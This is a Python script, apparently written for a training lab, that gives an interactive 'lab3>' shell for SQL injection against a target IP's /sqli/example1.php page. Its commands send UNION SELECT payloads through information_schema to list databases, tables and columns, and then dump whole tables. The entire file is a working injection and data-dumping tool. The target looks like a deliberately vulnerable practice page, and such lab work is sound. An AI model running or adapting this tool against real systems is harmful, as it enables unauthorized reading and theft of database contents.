#!/usr/bin/env python

import sys
import os
import requests
import re

def interactiveShell():
	while True:
		inStr = input("lab3> ")
		inStr = inStr.split(" ")
		
		if inStr[0] == "exit":
			print("Good Bye")
			break
		elif inStr[0] == "dbs":
			# Getting the http request in a readable format
			httpReq = requests.get("http://" + siteIP + "/sqli/example1.php?name=root%27+UNION+SELECT+group_concat(0x7c,schema_name,0x7c),+2,+3,+4,+5+FROM+information_schema.schemata%23").text.split("\n")
			
			# Isolating the line we need
			httpReq = httpReq[48]
			
			# Because of how the information is displayed, we split it on the "|" character to isolate the names of the databases
			httpReq = httpReq.split("|")
			
			# Every odd indexed value in the line is a database
			databases = ""
			for i in range (1, len(httpReq), 2):
				databases += httpReq[i] + "\n"
			print(databases)
			
			
		elif inStr[0] == "tables":
			# Extremely similar to the dbs request but with a different url
			httpReq = requests.get("http://" + siteIP + "/sqli/example1.php?name=root%27UNION+SELECT+group_concat(0x7c,table_name,0x7c),+2,+3,+4,+5+FROM+information_schema.tables+WHERE+table_schema=%27"+ inStr[1] + "%27%23").text.split("\n")
			httpReq = httpReq[48]
			httpReq = httpReq.split("|")
			tables = ""
			for i in range (1, len(httpReq), 2):
				tables += httpReq[i] + "\n"
			print(tables)
			
			
		elif inStr[0] == "columns":
			# Extremely similar to the dbs request but with a different url
			url = "http://" + siteIP + "/sqli/example1.php?name=root%27+UNION+SELECT+group_concat(0x7c,column_name,0x7c),+2,+3,+4,+5+FROM+information_schema.columns+WHERE+table_schema=%27" + inStr[1] + "%27+and+table_name=%27" + inStr[2] + "%27%23"
			httpReq = requests.get(url).text.split("\n")
			httpReq = httpReq[48]
			httpReq = httpReq.split("|")
			columns = ""
			for i in range (1, len(httpReq), 2):
				columns += httpReq[i] + "\n"
			print(columns)
		
		
		elif inStr[0] == "dump":
			colReq = requests.get("http://" + siteIP + "/sqli/example1.php?name=root%27+UNION+SELECT+group_concat(0x7c,column_name,0x7c),+2,+3,+4,+5+FROM+information_schema.columns+WHERE+table_schema=%27" + inStr[1] + "%27+and+table_name=%27" + inStr[2] + "%27%23").text.split("\n")
			colReq = colReq[48]
			colReq = colReq.split("|")
			columnNames = []
			for i in range (1, len(colReq), 2):
				columnNames.append(colReq[i])
			
			table = []
			
			for i in range (len(columnNames)):
				colReq = requests.get("http://" + siteIP + "/sqli/example1.php?name=root%27+UNION+SELECT+" + columnNames[i] + ",+@,+@,+@,+@+FROM+" + inStr[2] + "%23").text.split("\n")
				colReq = colReq[48]
				column = colReq[53:len(colReq)-50].split("</td><td></td><td></td></tr><tr><td>")
				if (i == 0):
					for k in range(len(column)):
						table.append([])
				
				for j in range (len(column)):
					table[j].append(column[j])
			
			outStr = ""
			for i in range(len(columnNames)):
				outStr += columnNames[i] + "\t"
			for i in range (len(table)):
				outStr += "\n"
				for j in range (len(table[i])):
					outStr += table[i][j] + "\t"
				
			print(outStr)
		
		
			
		else:
			httpReq = requests.get("http://" + siteIP + "/sqli/example1.php?name=root%27+UNION+SELECT+*+FROM+information_schema.schemata%23")
			print(httpReq.text)
	return


if __name__ == "__main__":
	n = len(sys.argv)
	if n != 2:
		print("Enter Server IP Address")
		print("Total arguments passed: ", n)
	else:
		args = sys.argv[1:]
		siteIP = args[0]
		interactiveShell()
